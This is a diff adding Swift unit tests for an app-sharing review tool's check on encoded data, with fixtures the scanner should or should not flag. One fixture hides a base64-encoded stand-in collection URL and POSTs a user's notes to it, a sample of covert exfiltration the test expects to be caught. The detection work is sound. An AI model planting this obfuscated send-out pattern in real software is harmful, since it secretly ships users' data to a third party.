@@ -177,6 +177,87 @@ final class SharedAppReviewTests: XCTestCase {
         XCTAssertEqual(review.opening, .anyway)
     }
 
+    // MARK: Encoded data
+
+    /// What the fixed checks make of one file, with the AI calling it low risk.
+    private func checked(_ code: String) throws -> ImportReview {
+        let folder = try appFolder(sources: ["App.swift": Data(code.utf8)])
+        let package = Sharing.Package(name: "Tally", folder: folder, sources: [folder.appendingPathComponent("Sources/App.swift")],
+                                      attachments: [], fileCount: 2)
+        let found = Sharing.inspect(package)
+        return ImportReview(summary: "", capabilities: [], concerns: [], risk: .low, reviewer: cloud, asked: true, detected: found.detected)
+    }
+
+    func testAnAddressHiddenInTheCodeIsFlagged() throws {
+        let review = try checked("""
+        import Foundation
+        let endpoint = "aHR0cHM6Ly9jb2xsZWN0LmV4YW1wbGUubmV0L3U="
+        func send(_ notes: String) {
+            guard let data = Data(base64Encoded: endpoint), let text = String(data: data, encoding: .utf8),
+                  let url = URL(string: text) else { return }
+            var request = URLRequest(url: url)
+            request.httpMethod = "POST"
+            request.httpBody = Data(notes.utf8)
+            URLSession.shared.dataTask(with: request).resume()
+        }
+        """)
+        XCTAssertTrue(review.detected.contains { $0.label.hasPrefix("Contains encoded data") })
+        XCTAssertEqual(review.verdict, .sensitive)
+        XCTAssertEqual(review.opening, .anyway)
+    }
+
+    /// Where to Watch's code as it was on 2026-10-16: it reads which service a link goes to out of the
+    /// encoded tag JustWatch puts on each link of the page it downloads.
+    func testDecodingWhatTheAppDownloadsIsNotFlagged() throws {
+        let review = try checked("""
+        import Foundation
+        enum ServiceLinks {
+            static func offers(for page: URL) async throws -> [(provider: String, type: String)] {
+                let (data, _) = try await URLSession.shared.data(from: page)
+                let html = String(decoding: data, as: UTF8.self)
+                return html.components(separatedBy: "cx=").dropFirst()
+                    .compactMap { $0.split(separator: "&").first.map(String.init) }
+                    .compactMap(decodeOffer)
+            }
+
+            /// The provider's name and the kind of offer, from JustWatch's click-out context.
+            private static func decodeOffer(_ cx: String) -> (provider: String, type: String)? {
+                var b64 = cx.replacingOccurrences(of: "-", with: "+").replacingOccurrences(of: "_", with: "/")
+                b64 += String(repeating: "=", count: (4 - b64.count % 4) % 4)
+                guard let data = Data(base64Encoded: b64),
+                      let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
+                      let contexts = json["data"] as? [[String: Any]] else { return nil }
+                for context in contexts {
+                    if let d = context["data"] as? [String: Any], let provider = d["provider"] as? String {
+                        return (provider, d["monetizationType"] as? String ?? "")
+                    }
+                }
+                return nil
+            }
+        }
+        """)
+        XCTAssertFalse(review.detected.contains { $0.level == .sensitive }, "\(review.detected.map(\.label))")
+        XCTAssertNotEqual(review.verdict, .sensitive)
+    }
+
+    /// A long name in ordinary words, which decodes to a line of punctuation and a few letters.
+    func testALongNameIsNotFlagged() throws {
+        let review = try checked("""
+        func testOnlyTheInstalledAppIsTheApp() {}
+        """)
+        XCTAssertFalse(review.detected.contains { $0.level == .sensitive }, "\(review.detected.map(\.label))")
+    }
+
+    /// Random ids made from base64's own alphabet: nothing is encoded or decoded.
+    func testAnAlphabetForMakingIdsIsNotFlagged() throws {
+        let review = try checked("""
+        let urlSafe = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
+        let standard = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+        func newID() -> String { String((0..<12).map { _ in urlSafe.randomElement()! }) }
+        """)
+        XCTAssertFalse(review.detected.contains { $0.level == .sensitive }, "\(review.detected.map(\.label))")
+    }
+
     // MARK: A rating with no account of the app
 
     func testASummaryThatSaysNothingIsNoAnswer() {
